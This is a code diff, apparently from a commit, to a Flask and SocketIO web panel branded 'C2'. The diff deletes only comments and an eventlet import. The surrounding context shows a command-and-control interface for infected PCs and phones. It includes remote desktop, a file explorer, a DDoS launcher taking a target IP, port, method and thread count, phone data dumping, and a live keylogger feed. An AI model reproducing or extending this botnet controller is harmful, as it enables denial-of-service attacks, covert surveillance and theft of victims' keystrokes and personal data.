@@ -1,6 +1,3 @@
-import eventlet
-eventlet.monkey_patch()
-
 from flask import Flask, render_template_string
 from flask_socketio import SocketIO
 import os
@@ -79,7 +76,6 @@ HTML = """
 </head>
 <body class="h-screen overflow-hidden flex">
 
-    <!-- SIDEBAR -->
     <aside class="sidebar w-72 flex flex-col h-full">
         <div class="p-4 border-b border-gray-800 flex items-center gap-3">
             <div class="w-8 h-8 rounded bg-blue-600 flex items-center justify-center text-white font-bold shadow-lg shadow-blue-500/30">C2</div>
@@ -133,7 +129,6 @@ HTML = """
         </div>
     </aside>
 
-    <!-- MAIN CONTENT -->
     <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative z-10">
         
         <header class="h-14 border-b border-gray-800 flex items-center justify-between px-6 bg-[#111827]">
@@ -153,7 +148,6 @@ HTML = """
             <p class="text-sm font-mono">NO CLIENT SELECTED</p>
         </div>
 
-        <!-- VIEW: CONTROL -->
         <div id="view-control" class="hidden flex-1 flex flex-col overflow-hidden fade-in">
             <div class="flex border-b border-gray-800 bg-[#111827] text-xs font-semibold text-gray-400">
                 <div onclick="switchTab('desktop', event)" class="tab-btn active px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-desktop"></i> Desktop</div>
@@ -243,7 +237,6 @@ HTML = """
             </div>
         </div>
 
-        <!-- VIEW: SYSTEM -->
         <div id="view-system" class="hidden flex-1 p-6 overflow-y-auto fade-in">
             <h2 class="text-lg font-bold text-white mb-6">System Management</h2>
             <div class="grid grid-cols-2 gap-4 max-w-4xl">
@@ -302,7 +295,6 @@ HTML = """
             </div>
         </div>
 
-        <!-- VIEW: NETWORK (DDoS) -->
         <div id="view-network" class="hidden flex-1 p-6 overflow-y-auto fade-in">
             <h2 class="text-lg font-bold text-white mb-6">DDoS Attack</h2>
             <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 space-y-4">
@@ -338,7 +330,6 @@ HTML = """
             </div>
         </div>
 
-        <!-- VIEW: CHAT -->
         <div id="view-chat" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
             <div class="flex justify-between items-center mb-4 max-w-4xl">
                 <h2 class="text-lg font-bold text-white">Live Chat</h2>
@@ -359,7 +350,6 @@ HTML = """
             </div>
         </div>
 
-        <!-- PHONE VIEWS -->
         <div id="view-phone-info" class="hidden flex-1 p-6 overflow-y-auto fade-in">
             <h2 class="text-lg font-bold text-white mb-6">Phone Info</h2>
             <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 font-mono text-sm space-y-2" id="phone-info-data"></div>
@@ -414,7 +404,6 @@ HTML = """
             </div>
         </div>
 
-        <!-- SPY LOGS -->
         <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6 space-y-4">
             <div class="flex-1 flex flex-col min-h-0">
                 <div class="flex justify-between items-center mb-2 max-w-4xl">
@@ -567,7 +556,6 @@ HTML = """
             if (tabId === 'explorer') requestDir('C:/');
         }
 
-        // --- PC LOGIC ---
         function startDdos() {
             const ip = document.getElementById('ddos-ip').value, port = document.getElementById('ddos-port').value, method = document.getElementById('ddos-method').value, threads = document.getElementById('ddos-threads').value;
             if (!ip || !port) return alert('Введи IP и порт!');
@@ -710,7 +698,6 @@ HTML = """
             const source = audioCtx.createBufferSource(); source.buffer = buffer; source.connect(audioCtx.destination); source.start();
         });
 
-        // --- PHONE LOGIC ---
         function dumpData(type) {
             if (!currentClientId) return;
             socket.emit('cmd_dump', { client_id: currentClientId, type: type });
@@ -748,7 +735,6 @@ HTML = """
             }
         });
 
-        // --- SPY LOGS ---
         socket.on('keylog', (data) => {
             if (data.client_id === currentClientId && !document.getElementById('view-keylog').classList.contains('hidden')) {
                 const out = document.getElementById('keylog-output'); out.innerText += data.data; out.scrollTop = out.scrollHeight;
